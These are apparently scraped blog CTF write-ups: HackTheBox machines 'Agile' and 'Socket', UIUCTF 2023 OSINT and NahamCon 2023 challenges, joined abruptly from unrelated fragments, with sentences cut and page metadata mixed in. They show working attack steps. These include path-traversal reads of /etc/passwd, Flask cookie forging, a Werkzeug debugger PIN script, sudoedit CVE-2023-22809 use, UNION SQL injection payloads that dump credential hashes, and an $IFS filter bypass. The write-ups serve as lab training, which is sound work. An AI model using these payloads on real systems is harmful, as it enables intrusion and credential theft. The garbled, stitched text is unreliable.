Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.\nWe can see upon clicking Export we are sent to the url http://superpass.htb/vault/export on a GET request:\nAn interesting finding at this point, we see that superpass.htb server is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in 404 Not Found. We will eventually learn that this service is running from Flask, although it wasn\u0026rsquo;t apparent at first glance if you didn\u0026rsquo;t run into the common SQLAlchemy error.\nSince we didn\u0026rsquo;t click the save icon when generating out password, it seems like our database is still empty.\nOnce we add a password, we can see the call redirects to a custom url, download?fn=asdf_export_49adcafaf8.csv. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:\nArbitrary file read in /download In a simpler approach, we can check if we are able to reference any file by specifying the path: http://superpass.htb/download?fn=../../../../../../../etc/passwd\nUpon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:\nIn this file we can see 4 user accounts:\n1 2 3 4 corum:x:1000:1000:corum:/home/corum:/bin/bash runner:x:1001:1001::/app/app-testing/:/bin/sh edwards:x:1002:1002::/home/edwards:/bin/bash dev_admin:x:1003:1003::/home/dev_admin:/bin/bash Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from /tmp/ and the flask SECRET is also displayed:\nNote, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or curl:\n1 2 3 4 5 6 \u0026lt;script\u0026gt; var CONSOLE_MODE = false, EVALEX = true, EVALEX_TRUSTED = false, SECRET = \u0026#34;tDxE1kBphctDjlZ1DvYf\u0026#34;; \u0026lt;/script\u0026gt; The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this download vulnerability.\nFrom here, we can enumerate all or most of the python source files by watching the imports. For example, from superpass.services.utility_service import get_random tells us that there is a python file accessible at /app/app/superpass/services/utility_service.py. We can also determine that the main app.py file will be located at /app/app/superpass/app.py, based on where the import path is starting.\nUnsuccessful Foothold Attempts Recreating export.csv My first thought is to see how the export is behaving. Since we have a list of usernames on the machine, perhaps we can recall an export.csv that they have previously generated? I find my answer in /app/app/superpass/views/services/password_service.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def generate_csv(user): rand = get_random(10) fn = f\u0026#39;{user.username}_export_{rand}.csv\u0026#39; path = f\u0026#39;/tmp/{fn}\u0026#39; header = [\u0026#39;Site\u0026#39;, \u0026#39;Username\u0026#39;, \u0026#39;Password\u0026#39;] session = db_session.create_session() passwords = session.query(Password) \\ .filter(Password.user_id == user.id) \\ .all() session.close() with open(path, \u0026#39;w\u0026#39;) as f: writer = csv.writer(f) writer.writerow(header) writer.writerows((p.get_dict().values() for p in passwords)) It looks like the numbers appended are from get_random, defined in /app/app/superpass/services/utility_service.py:\n1 2 3 4 5 import datetime import hashlib def get_random(chars=20): return hashlib.md5(str(datetime.datetime.now()).encode() + b\u0026#34;SeCReT?!\u0026#34;).hexdigest()[:chars] It includes a time variable which we have no way of knowing. Essentially, it is technically possible to try to brute force potential exports by guessing every possible combination of 10 characters. But this can be considered a last resort, as it is not guaranteed that machine usernames will match the service\u0026rsquo;s account names, nor guarantee that the user had generated a csv file at all.\nForging a flask cookie My next thought is with the source code available and the flask secret (given through the error), we might try to forge a cookie for a different user.\nStarting with our cookie, we can grab it from Burpsuite\u0026rsquo;s request after session=\n1 .eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d8YfH9o4y4B.ZMqudQ.Z2CKAj5PpZ0A7xvhgTgYMlpMJ0c Visiting a Flask cookie decoder online tool, we can decode without issue into something more readable:\n1 2 3 4 5 { \u0026#34;_fresh\u0026#34;: true, \u0026#34;_id\u0026#34;: \u0026#34;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#34;, \u0026#34;_user_id\u0026#34;: \u0026#34;9\u0026#34; } While the _id appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask\u0026rsquo;s secret key. To do so, I utilize the popular tool Flask-Unsign.\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/Documents/Agile] └─$ cat tosign.txt {\u0026#39;_fresh\u0026#39;: True, \u0026#39;_id\u0026#39;: \u0026#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96\u0026#39;, \u0026#39;_user_id\u0026#39;: \u0026#39;0\u0026#39;} ┌──(kali㉿kali)-[~/Documents/Agile] └─$ flask-unsign -s -S \u0026#39;tDxE1kBphctDjlZ1DvYf\u0026#39; --cookie tosign.txt InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk Unfortunately, trying to use this cookie resulted in a failure.

Apparently it was never an intended approach.\nFoothold Recreating Werkzeug\u0026rsquo;s Debugger PIN Eventually I turn myself to the system\u0026rsquo;s active debugger mode. We noticed that this is turned on, since when we requested to download a file that didn\u0026rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:\nHowever, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.\nThere is a hacktricks article covering how we generate a matching PIN number based on some of the system\u0026rsquo;s information.\nWe must gather system information utilized to generate the PIN, then we can recreate it locally using the script presented in the article. Each component was a small adventure to get. The final script contained the following information:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import hashlib from itertools import chain probably_public_bits = [ \u0026#39;www-data\u0026#39;,# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;wsgi_app\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/app/venv/lib/python3.10/site-packages/flask/app.py\u0026#39; # getattr(mod, \u0026#39;__file__\u0026#39;, None), ] private_bits = [ \u0026#39;345052401235\u0026#39;,# str(uuid.getnode()), /sys/class/net/ens33/address \u0026#39;ed5b159560f54721827644bc9b220d00superpass.service\u0026#39;# get_machine_id(), /etc/machine-id ] Username as www-data is common for linux web services, although python can also be run by users as well. I had been trying combinations with both www-data as well as runner, as this account seemed like it might have been generated for the sole purpose of running a web server. Modname as flask.app is the default option provided by Hacktricks, but also we can see this in app.py, where it simply states import flask. wsgi_app was the hardest to find, as this variable is not well defined in the article, simply presented as Flask. Under def enable_debug(): from app.py, we see the debug application referred to as app.wsgi_app = DebuggedApplication(app.wsgi_app, True). /app/venv/lib/python3.10/site-packages/flask/app.py is given on the error page. Private Bits: When accessing /sys/class/net/eth0/address, we get id 00:50:56:b9:ce:53: To convert into the private bit variable, we utilize python to print:\n1 2 \u0026gt;\u0026gt;\u0026gt; print(0x005056b9ce53) 345052401235 Machine ID is a combination of /etc/machine-id and the last section of /proc/self/cgroup.

Features such as autocomplete or interactive binaries such as vim will not work well, so we need to stabilize the shell.

However, executing linpeas showed me a potential route to privilege escalation i was unaware of.\nThere is a process of google chrome running, and special attention is drawn to the fact that the --remote-debugging-port flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what runner can access in this webpage. First, we need a way for our local browser to reach the box\u0026rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach\n1 $ ssh -L 1080:localhost:41829 corum@superpass.htb To enter the port forwarding page in Google Chrome, in the url segment we type chrome://inspect/#devices. Next, we must configure our ports to the right of \u0026ldquo;Discover network targets\u0026rdquo;\nSet the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box\u0026rsquo;s port 41829.\nNow we can see a remote target. Notice the address is at http://test.superpass.htb. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.\nSelecting inspect will open a new DevTools tab, where we can interact with the chrome session.\nSelecting the Vault, we see new passwords, this time for edwards. This was also a user account name on the machine.\nUsing the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.\n1 2 3 \u0026lt;td\u0026gt;agile\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;edwards\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;d07867c6267dcb5df0af\u0026lt;/td\u0026gt; edwards:d07867c6267dcb5df0af\n1 2 3 corum@agile:~$ su edwards Password: edwards@agile:/home/corum$ Privilege escalation through sudo vulnerability The su is successful, and we now have 1 more user\u0026rsquo;s account to work with. Checking this account\u0026rsquo;s privileges, we see we can perform a sudo as dev_admin:\n1 2 3 4 5 6 7 8 edwards@agile:/home/corum$ sudo -l Matching Defaults entries for edwards on agile: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User edwards may run the following commands on agile: (dev_admin : dev_admin) sudoedit /app/config_test.json (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt This /app/app-testing/tests/functional/creds.txt is very desirable based on the name, and is only accessible by dev_admin. Upon running:\n1 edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt We see in a nano editor some more credentials for edwards.\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\nThe credentials don\u0026rsquo;t work for any user on the system; perhaps they are utilized for the google chrome debugging session?\nSearching for problems with sudoedit, I quickly find a very recent CVE, CVE-2023-22809. This CVE was released in under two months from the time of writing. Affected versions are 1.8.0 through 1.9.12.p1, so first we must check this:\n1 2 3 4 5 6 edwards@agile:/home/corum$ sudo -V Sudo version 1.9.9 Sudoers policy plugin version 1.9.9 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.9 Sudoers audit plugin version 1.9.9 Version 1.9.9 will be before version 1.9.12, so this should be vulnerable! Execution seems very straightforward. If we include extra arguments in environment variables (SUDO_EDITOR, VISUAL, and EDITOR), sudoedit will allow us to edit files not meant to be edited. With this strategy, we can edit any file dev_admin can edit. Looking for interesting targets:\n1 2 3 4 5 6 7 8 9 10 11 12 13 edwards@agile:/home/corum$ find / -user dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/app-testing/tests/functional/creds.txt /app/config_test.json /app/config_prod.json edwards@agile:/home/corum$ find / -group dev_admin 2\u0026gt;/dev/null /home/dev_admin /app/venv /app/venv/bin /app/venv/bin/activate /app/venv/bin/Activate.ps1 /app/venv/bin/activate.fish /app/venv/bin/activate.csh Using the sudoedit exploit, we should be able to alter any of these files. But how can we really benefit from adding a line or two in some of these files? If there is a regularly running program that takes input from one of these files, we can supply malicious commands for that user to execute. Ideally, if there is a cronjob running as root for regular intervals, we can have root execute some commands for us. We can check for things as they run using pspy.

Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Mar 25 21:07:29 2023 -- 1 IP address (1 host up) scanned in 92.72 seconds We can see from Server: Python/3.10 websockets/10.4, that this unusual port is an open web socket. We will come back to this later.\nExamining the webpage Trying to visit the box\u0026rsquo;s ip address as 10.10.11.206 redirects us to qreader.htb. To properly visit the webpage that should be visible on port 80, we must add the address to our /etc/hosts file:\n1 $ echo \u0026#34;10.10.11.206 qreader.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Now the website is viewable.\nWe see the website advertised as a QR code reader:\nWe can test it out within the browser, or they allow us to download an offline version further below. There are options for windows or linux versions. Being on linux, I will use this version for now and hope there is no significant difference between the two.\n1 2 $ file QReader_lin_v0.0.2.zip QReader_lin_v0.0.2.zip: Zip archive data, at least v1.0 to extract, compression method=store Analyzing the QR Code Reader The zip contains an ELF binary for the QR code reader and a test.png to try it out\nAfter translating test.png it returns the box creator\u0026rsquo;s username. Nice touch. Selecting the about tab, and trying to get info on either the version or updates will return this Connection error message. What could it be connecting to, perhaps our box\u0026rsquo;s WebSocket port? Since the box itself is created and tested with static IP addresses, it isn\u0026rsquo;t unreasonable to believe that when the box is moved to live environments with the hosting IP address constantly changing, that connection attempts like this one might fail.\nWith the app open, I monitored the packet traffic data using tcpdump:\n1 2 3 4 5 6 7 8 $ sudo tcpdump tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes \u0026lt;...SNIP...\u0026gt; 20:04:21.317409 IP 10.0.2.15.53274 \u0026gt; 108-166-149-2.client.mchsi.com.domain: 56266+ A? ws.qreader.htb.

I had heard the data can be retrieved through decompiling the binary file, but this is beyond my skill at the time.\nExamining the exposed WebSocket Interacting with web sockets can be tricky. There are a variety of ways to do it, but I chose to utilize a Simple WebSocket Client Plugin for FireFox. Loading the page, we can input our url as ws://10.10.11.206:5789\nFortunately for us, it looks as though an improper input provides us with a small list of options on how we might interact. Since the output was JSON format, it is likely that the input must be JSON as well. After exploring for a bit, I find another response when probing ws://10.10.11.206:5789/update\nIt was a bit of a lucky hit that any version not 0.0.2 will return a message like this, otherwise it could be more difficult finding the version naming conventions in use. Now returning to /version, I check what happens when I input the older version 0.0.1:\nThere doesn\u0026rsquo;t seem to be any extra information leaked through these queries. Upon closer inspection, however, we can eventually discover that these /version queries are SQL injectable.\nNote that despite supplying the invalid version, we still receive the confirmation of version 0.0.2. From here, we should be able to leak the database information.\nFoothold Manual enumeration with SQLi UNION injections Eventually I find that the database is sqlite through the query UNION SELECT sql from sqlite_master:\n1 2 3 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Note that this type of sql injection often depends on having the same number of columns as the usual output. Since typically this websocket is expected to provide 4 columns (id, version, release_date and downloads), I supplement my union injection with 3 columns of NULL.\nThis first output shows a table called versions, which is likely what we are already getting from non-injected queries. Dumping all tables might be slow this way, but we can do so by supplying LIMIT to our query:\nNote that in this query I use tbl_name, so that the output isn\u0026rsquo;t so long. Using sql provides us information on all column names from within the table, so it is useful to use once we find an interesting table. For a better word-wrapping experience, from this point on I put all outputs in code brackets\nAfter dumping all tables, we see a full picture that looks like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT, answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 3-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 4-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE sqlite_sequence(name,seq)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 5-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 6-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} Users database is a clear standout, and may contain valuable credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)\u0026#34;, \u0026#34;version\u0026#34;: null, \u0026#34;released_date\u0026#34;: null, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 1-- -\u0026#34;} {\u0026#34;message\u0026#34;: {\u0026#34;id\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0c090c365fa0559b151a43e0fea39710\u0026#34;, \u0026#34;released_date\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;downloads\u0026#34;: null}} {\u0026#34;version\u0026#34;:\u0026#34;0.0.3\\\u0026#34;UNION SELECT username,password,role,NULL FROM users where id = 2-- -\u0026#34;} {\u0026#34;message\u0026#34;: \u0026#34;Invalid version!\u0026#34;} After dumping credentials for admin, there are no other entries in the table.

This can give us potential ideas as to what username(s) might be on the machine.\nBonus: using SQLMap to dump the database Because the SQL injection is done through a WebSocket interaction, utilizing SQLMap is a little more complex than usual. Although SQLMap has WebSocket compatibility, it has been difficult to properly launch in my experience. However, there is a nice blog article that highlights a clever approach to using sqlmap over a WebSocket. In this approach, the author sets up a python server script that will receive SQLMap\u0026rsquo;s queries, transform the payload to a relevant JSON query, then redirect it to the WebSocket of interest.\nFirst, the python redirection script needs to be updated to our situation. The ws_server value must be changed, and also the payload replace line must be altered.

If the SQLi type had been a blind injection, enumerating everything by hand can be extremely time consuming. It is good to know how we might make automation for this task possible.\nAuthenticating through ssh With exploration of the database finished, we can finally move on to the obtained Administrator credentials. Since it is information stored in the sqlite table, it is highly likely to be a password hash. Fortunately enough, we don\u0026rsquo;t even have to crack it ourselves. A quick trip over to crackstation, and we get the plaintext password immediately.\nWe now have creds as Admin:denjanjade122566\nTrying to log in through ssh:\n1 2 3 $ ssh admin@qreader.htb admin@qreader.htb\u0026#39;s password: Permission denied, please try again.

Pyinstaller is used to compile easily-launchable binary files from python code. In this situation, pyinstaller is used so that the QReader code, written in python, can exist in a single executable for users to download. Pyinstaller compiling can be well customized through use of .spec files, which it uses to determine how to process your python script. More info can be found [here]](https://pyinstaller.org/en/stable/spec-files.html). Since we are running pyinstaller as root, perhaps we can define in the .spec file for root to do other actions.\nUsing the make script to produce a .spec template For testing around, I used a python rev shell script.

The SQLi vulnerability can be easily missed, and without extra help, SQLMap can give a lot of problems as well.

Though I did not personally solve all of them myself I will cover the related challenges solved by teammates as well.\nWhat\u0026rsquo;s for Dinner? Jonah Explorer, world renowned, recently landed in the city of Chicago, so you fly there to try and catch him. He was spotted at a joyful Italian restaurant in West Loop. You miss him narrowly but find out that he uses a well known social network and and loves documenting his travels and reviewing his food. Find his online profile.\nWith this prompt, we are informed of Jonah enjoying an italian dinner within a small subsection of Chicago. Given this information, I began sifting through all italian restaurants within that zone looking for a recent review or posting by our Jonah. After searching for hours, my fellow colleague managed to find a twitter account belonging to him. Surprisingly enough, Jonah had zero tweets announcing his dinner or even mentioning the place in Chicago. I still don\u0026rsquo;t know where he ate. His only tweet is one containing the flag. uiuctf{i_like_spaghetti}\nFinding Jonah? Jonah offered a reward to whoever can find out what hotel he is staying in. Based on the past information (chals), can you find out what the hotel he stayed at was? Flag should be uiuctf{hotel_name_inn}\nProvided image:\nWe can see two rather tall buildings, with the left one having more identifiable features in a curved top shape. Perusing the tallest buildings in chicago we can identify it fairly quickly as River Point, located at 444 West Lake Street. We know we are looking at a hotel, so from here we can try to guess the hotel location based on the angle of the building, and the relative sizes of the nearby buildings. Eventually we land on a successful guess of uiuctf{hampton_inn}. The inn can be found at this location\nJonah\u0026rsquo;s Journal After dinner, Jonah took notes into an online notebook and pushed his changes there. His usernames have been relatively consistent but what country is he going to next? Flag should be in format uiuctf{country_name}\nThis challenge is dependent on solving What's For Dinner?, as this one contains the key info of account username. There are several online notetaking services, but the language here is a strong suggestion on where it might be. It states that jonah \u0026ldquo;pushed his changes there\u0026rdquo;. The reference here is likely to a git push, which is the method to submit changes on git based services such as github. Searching here we can see right away, https://github.com/jonahexplorer. There is exactly 1 public repo on this account, and in it he states the following:\n1 2 3 storing all my adventure codes I think that the next place I wanna visit is the great wall of china, but not until I get off of flight UA5040 And so, we have our answer. uiuctf{china}.\nFirst class mail Jonah posted a picture online with random things on a table. Can you find out what zip code he is located in? Flag format should be uiuctf{zipcode}, ex: uiuctf{12345}.\nProvided image:\nThe image contains a lot of items, but only a couple stand out as interesting. The first being an insurance letter with the return address in plain sight. Trying uiuctf{16530} did not pass, so this address is not it. The other letter, however, has the mail address hidden but the mail barcode is shown in plain sight. Intelligent Mail Barcodes are used by the USPS to sort mail delivery quickly and easily. If we can decode this, we might be able to learn Jonah\u0026rsquo;s zip code. We can convert the barcode using this decoder key, then submitting it to an online decoder tool:\nDecoding our letter: FDFFDDFFDDDDFFDDDFFDDDDDFFDDDFFDDDFFDDFDFDDFFDDFDDFF\nUsing dcode.fr to decode:\nWe see the 9-digit zip as 606611234. This is known as ZIP+4, as the last 4 digits are extra specifiers to pinpoint a subsection within a regular ZIP address. The flag is only asking for the zip address with an example of 5 digits, so we submit the ZIP without the +4 appended: uiuctf{60661}.\n","date":"2023-07-03T11:37:04-05:00","permalink":"https://yuwenmichael.netlify.app/post/uiuctf_2023/","title":"UIUCTF_2023"},{"content":"Warmup Fast Hands Author: @JohnHammond#6971\nYou can capture the flag, but you gotta be fast!\nWe are given a button to Capture The Flag:\nClicking the button opens a new window that closes rather abruptly.

Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:\nWhat\u0026rsquo;s even more interesting is this does nothing.

I learned the proper syntax that should work for testing purposes, but nothing connects back:\n1 2 3 4 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) Say \u0026#34;Test\u0026#34; client_loop: send disconnect: Broken pipe After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) \u0026#39;say test\u0026#39; ; run \u0026#39;say test\u0026#39;; Say \u0026#34;Test\u0026#34;; exec run ; go ^F mysh: say: not found ^Fmy my sh: RUN: not found sh: say: not found Test sh: EXEC: not found sh: RUN: not found Ssh: GO: not found Connection to challenge.nahamcon.com closed. While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed ^F in the cli, I was under the impression that I also had pressed ^D and this keystroke was important for the execution. However, simply pressing ^D on its own ended up terminating the ssh connection.\nEventually I landed on a goofy pattern to execute, where I write my commands, quickly press the enter key two times, immediately followed by ^D, then another enter stroke. With this, my commands would be executed and then the connection terminated.\n1 2 3 4 5 6 7 8 9 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;ls\u0026#34; Say \u0026#34;Test\u0026#34; flag.txt Test Connection to challenge.nahamcon.com closed. 1 2 3 4 5 6 7 8 9 10 /usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit) ADDRESS SYSTEM \u0026#34;cat flag.txt\u0026#34; Say \u0026#34;Test\u0026#34; flag{2459b9ae7c704979948318cd2f47dfd6} Test Connection to challenge.nahamcon.com closed. CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.\nMisc Goose Chase Author: @JohnHammond#6971\nI am truly sorry. I really do apologize\u0026hellip; I hope you can bear with me as I set you all loose together, on a communal collaboriative wild goose chase.\nWithin the google sheet, we see a hidden sheet if we check the bottom left:\nIt seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:\nUnder our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (View -\u0026gt; Show -\u0026gt; Formulas).\nFollowing this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:\n1 Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv It isn\u0026rsquo;t obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:\nflag{323264294cc2a4ebb2c8d5f9e0afb0f7}\nOne Zero Author: @JohnHammond#6971\nYou only get one zero. ;)\nNOTE, This solution utilizes an unintended interaction.\nWe are given a file to see the restrictions placed.

Next I found that I can append letter characters after a zero, and I still bypass the allowlist:\n1 2 user@one_zero:~$ 0whoami bash: 0whoami: command not found So far nothing is workable. After attempting some other additional operators:\n1 2 3 user@one_zero:~$ 0||whoami bash: 0: command not found Sorry, you used a character that is not in the allowlist! My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.\nI know the bash special variable $IFS is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:\n1 2 3 4 user@one_zero:~$ ${IFS}whoami user user@one_zero:~$ ${IFS}ls flag.txt In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!

If one sudo process is immediately sent to bg, it will fail to launch once i try to fg, since the password had not really been submitted.\nAfter spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control.

Also notable is the tail -f . The -f flag is a live following, or reading the final lines of the file. We can also see a trailing \u0026amp;, meaning this has been set to background.

Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nFirst challenge places us on a golf course, at some kind of ceremony/speech. The first object of interest is the large event banner, containing the phrase \u0026ldquo;all Thailand Premier Championship\u0026rdquo;. There is more text, Road to (something), that I was unable to accurately read.\nSearching for all Thailand, we quickly see a webpage for a golf tour org. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image\u0026rsquo;s banner: \u0026ldquo;Road to Singha (something)\u0026rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found all Thailand Premier Championship - Road to Singha Masters located on the media page. Following the link takes us to a video, and right away in the video we are given a location\u0026ndash;Singha Park in Khon Kaen.\nI found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.\nFinally with the pinpointed location, we get the flag.\nflag{3e3d01a002db29fec2a5e10ec758b852}\nChall2 Author: @Gary#4657\nHead over to https://osint.golf and select chall2 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nThe second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.\nVery quickly I find a very similar capture, labeling it Napoleon\u0026rsquo;s Elba Hideaway. The article notes that this location is in Portoferraio, Italy.\nOnce again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:\nflag{e54fcc18854f0adfdedf22120c346b3a}\nChall3 Author: @Gary#4657\nHead over to https://osint.golf and select chall3 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nWe are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match. From chall3:\nFrom 